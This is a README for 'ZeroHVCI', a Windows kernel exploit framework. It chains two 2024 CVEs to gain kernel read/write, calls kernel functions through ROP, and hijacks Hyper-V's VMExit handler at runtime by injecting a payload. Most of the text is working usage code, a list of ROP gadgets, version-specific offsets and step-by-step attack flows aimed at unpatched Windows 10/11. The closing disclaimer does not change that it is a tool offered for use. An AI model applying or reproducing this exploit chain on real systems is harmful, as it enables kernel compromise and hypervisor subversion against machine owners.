# ZeroHVCI + Runtime Hyper-V Hijacking Framework

This directory contains the ported ZeroHVCI exploit framework with **Runtime Hyper-V Hijacking** capabilities, integrated into the Ombra Hypervisor OmbraLoader project.

## Overview

ZeroHVCI is a Windows kernel exploit framework that leverages two CVEs to obtain kernel read/write primitives:

- **CVE-2024-26229**: CSC (Client-Side Caching) vulnerability
- **CVE-2024-35250**: KS (Kernel Streaming) vulnerability

The framework provides:
1. Kernel memory read/write primitives
2. ROP-based arbitrary kernel function calling (KernelForge)
3. Kernel pool allocation capabilities
4. **Runtime Hyper-V VMExit handler hijacking** (no bootkit required!)

## Architecture

All components are wrapped in the `zerohvci` namespace to avoid naming conflicts with OmbraLoader.

### Component Files

| File | Purpose |
|------|---------|
| **ntdefs.h** | NT kernel structure definitions and function pointer types |
| **utils.h** | Utility functions (kernel object leaking, PE parsing, signature matching) |
| **exploit.h** | CVE exploit implementations (CSC and KS) |
| **kforge.h** | KernelForge ROP framework for calling kernel functions |
| **zerohvci.h** | Unified public API header |
| **zerohvci.cpp** | API implementation and initialization logic |
| **hyperv_hijack.h** | Runtime Hyper-V VMExit handler hijacking (Phase 3.0) |
| **hypercall_verify.h** | Hypercall verification after hijacking (Phase 3.1) |
| **hypercall.asm** | CPUID-based hypercall assembly implementation |
| **RUNTIME_HIJACK_EXAMPLE.cpp** | Complete usage example for runtime hijacking |
| **HYPERCALL_VERIFY_EXAMPLE.cpp** | Examples for hypercall verification |
| **INTEGRATION_EXAMPLE.cpp** | Basic kernel R/W usage examples |

### Namespace Structure

```cpp
namespace zerohvci {
    // Main API
    bool Initialize();
    bool ReadKernelMemoryEx(void* src, void* dst, size_t size);
    bool WriteKernelMemoryEx(void* dst, void* src, size_t size);
    void* AllocateKernelPool(size_t size);
    void Cleanup();

    namespace kforge {
        // ROP-based kernel function calling
        template<typename Ret, typename... Args>
        Ret CallKernelFunctionViaName(const char* funcName, Args... args);

        PVOID ExAllocatePool(POOL_TYPE PoolType, SIZE_T Size);
    }

    namespace hyperv {
        // Runtime Hyper-V hijacking
        class RuntimeHijacker {
            bool Initialize();
            bool HijackHyperV(const BYTE* payloadData, size_t payloadSize);
            // ... more methods
        };
    }

    namespace hypercall {
        // Hypercall verification (Phase 3.1)
        uint64_t GenerateSessionKey();
        bool SetCommunicationKey(uint64_t key);
        bool VerifyHypercallWorks(uint64_t* outCr3, uint64_t session_key);
        uint64_t VerifyHypervisorActive();
    }
}
```

## Usage

### Runtime Hyper-V Hijacking (NEW!)

The killer feature - hijack Hyper-V's VMExit handler at runtime without any bootkit:

```cpp
#include "zerohvci/zerohvci.h"
#include "zerohvci/hyperv_hijack.h"
#include <vector>

int main() {
    // Phase 1: Initialize kernel exploit
    if (!zerohvci::Initialize()) {
        printf("[-] Exploit failed\n");
        return -1;
    }

    // Phase 2: Initialize Hyper-V hijacker
    zerohvci::hyperv::RuntimeHijacker hijacker;
    if (!hijacker.Initialize()) {
        printf("[-] Hyper-V not available\n");
        return -2;
    }

    // Phase 3: Load and inject payload
    std::vector<BYTE> payload = LoadPayloadFromFile(
        hijacker.IsIntel() ? "PayLoad-Intel.dll" : "PayLoad-AMD.dll"
    );

    if (!hijacker.HijackHyperV(payload.data(), payload.size())) {
        printf("[-] Hijack failed\n");
        return -3;
    }

    printf("[+] All VMExits now route through our payload!\n");

    // Phase 4: Verify hypercall communication (NEW in Phase 3.1)
    #include "zerohvci/hypercall_verify.h"

    uint64_t session_key = zerohvci::hypercall::VerifyHypervisorActive();
    if (session_key == 0) {
        printf("[-] Hypercall verification failed\n");
        return -4;
    }

    printf("[+] Hypercall communication verified!\n");
    printf("[+] Session key: 0x%016llX\n", session_key);

    // Hypervisor is now active and verified - use libombra API for operations
    return 0;
}
```

### Basic Integration

```cpp
#include "zerohvci/zerohvci.h"

int main() {
    // Initialize exploit chain
    if (!zerohvci::Initialize()) {
        printf("[-] ZeroHVCI initialization failed\n");
        return -1;
    }

    // Read kernel memory
    ULONG64 value = 0;
    if (zerohvci::ReadKernelMemory(kernelAddr, &value, sizeof(value))) {
        printf("[+] Read: 0x%llx\n", value);
    }

    // Write kernel memory
    ULONG64 newValue = 0x1337;
    if (zerohvci::WriteKernelMemory(kernelAddr, &newValue, sizeof(newValue))) {
        printf("[+] Write successful\n");
    }

    // Allocate kernel pool
    void* pool = zerohvci::AllocateKernelPool(0x1000);
    if (pool) {
        printf("[+] Allocated pool at: %p\n", pool);
    }

    // Cleanup
    zerohvci::Cleanup();
    return 0;
}
```

### Advanced: Direct Kernel Function Calls

```cpp
#include "zerohvci/kforge.h"

// Call ExAllocatePool directly
PVOID pool = zerohvci::kforge::ExAllocatePool(NonPagedPoolNx, 0x1000);

// Call any exported kernel function
PVOID result = zerohvci::kforge::CallKernelFunctionViaName<PVOID>(
    "MmGetSystemRoutineAddress",
    &unicodeString
);
```

## Initialization Flow

### ZeroHVCI (Kernel R/W) Flow

```
1. Leak EPROCESS/KTHREAD addresses
   └─> GetCurrentEProcess() / GetCurrentKThread()

2. Trigger exploit to obtain kernel R/W
   ├─> Try CSC exploit (CVE-2024-26229)
   └─> Fallback to KS exploit (CVE-2024-35250)

3. Initialize KernelForge for ROP
   ├─> Map ntoskrnl.exe into userspace
   ├─> Scan for ROP gadgets
   └─> Locate ZwTerminateThread for cleanup

4. Test kernel memory access
   └─> Verify read primitive works
```

### Runtime Hyper-V Hijacking Flow

```
1. Verify Hyper-V presence
   └─> Read KUSER_SHARED_DATA hypervisor fields

2. Detect CPU vendor
   └─> CPUID(0) → "GenuineIntel" or "AuthenticAMD"

3. Find Hyper-V module
   ├─> Walk PsLoadedModuleList
   └─> Match hvix64.exe (Intel) or hvax64.exe (AMD)

4. Scan for VMExit handler
   ├─> Read hv.exe into usermode buffer
   ├─> Pattern match Intel or AMD signature
   └─> Extract CALL instruction address

5. Allocate payload memory
   └─> ExAllocatePool(NonPagedPoolNx, size) via KernelForge

6. Map payload into kernel
   ├─> Copy PE headers and sections
   ├─> Process relocations
   └─> Populate ombra_context export

7. Patch VMExit handler
   ├─> Calculate RVA to payload entry
   └─> Write 4-byte patch to CALL instruction

8. SUCCESS: All VMExits now route through payload!
```

## Windows Version Compatibility

The framework includes KTHREAD offset definitions for multiple Windows versions:

| Version | KTHREAD->PreviousMode Offset |
|---------|------------------------------|
| Win10 1809 - 22H2 | 0x232 |
| Win11 21H2 - 23H2 | 0x232 |

Default: Win10 22H2 (0x232)

Future enhancement: Dynamic offset detection based on `GetVersionEx()`.

## Security Considerations

1. **Administrator Privileges Required**: Exploits require admin to open kernel handles
2. **HVCI Must Be Disabled**: Exploits bypass kCFG but require HVCI off
3. **Process Instability**: After using exploits, process should terminate (kernel stack corrupted)
4. **Patch Status**: Works on unpatched Windows 10/11 (pre-May 2024 updates)

## Implementation Notes

### Global Variables

All global variables use `inline` storage to avoid ODR violations when included in multiple translation units:

```cpp
inline DWORD_PTR g_KernelAddr = 0;
inline PVOID g_KernelImage = nullptr;
inline pNtReadVirtualMemory NtReadVirtualMemory = nullptr;
```

### Function Pointers

NT API function pointers are dynamically resolved via `GetProcAddress()`:

- `NtReadVirtualMemory` - Read from kernel address space
- `NtWriteVirtualMemory` - Write to kernel address space
- `NtFsControlFile` - Trigger CSC exploit

### ROP Gadgets

KernelForge scans ntoskrnl.exe for 5 critical gadgets:

1. **RopAddr_1**: `mov rax/rcx/rdx/r8/r9 from stack; jmp rax` (argument control)
2. **RopAddr_2**: `add rsp, 68h; ret` (stack reservation)
3. **RopAddr_3**: `pop rcx; ret` (RCX control)
4. **RopAddr_4**: `mov [rcx], rax; ret` (save return value)
5. **RopAddr_5**: `ret` (stack alignment)

## Build Requirements

### Headers
- `Windows.h`
- `winternl.h`
- `Psapi.h`
- `Ks.h` (Windows Driver Kit)
- `KsMedia.h` (WDK)

### Libraries
- `ntdll.lib`
- `Psapi.lib`
- `ksproxy.lib` (for KsOpenDefaultDevice)

### Compiler Flags
- C++17 or later (`/std:c++17`)
- Exception handling enabled (`/EHsc`)

## Limitations

1. **Single-Use**: Exploit can only be triggered once per process
2. **No Cleanup**: KTHREAD->PreviousMode remains modified after exploit
3. **Version-Specific Offsets**: Hardcoded for Win10/11 22H2
4. **No HVCI Support**: Requires HVCI disabled
5. **Unpatched Systems Only**: Patched after May 2024

## Future Enhancements

- [ ] Dynamic Windows version detection
- [ ] KTHREAD offset calculation via pattern scanning
- [ ] CR3 extraction from EPROCESS/KTHREAD
- [ ] Restore PreviousMode on cleanup (if possible)
- [ ] Support for additional CVEs as fallbacks

## Credits

Original ZeroHVCI framework by the security research community.

Ported and integrated into Ombra Hypervisor V3 by ENI (December 2025).

## Disclaimer

This code is for **educational and research purposes only**. Using these exploits on systems you do not own or without explicit permission is illegal. The authors are not responsible for misuse of this code.
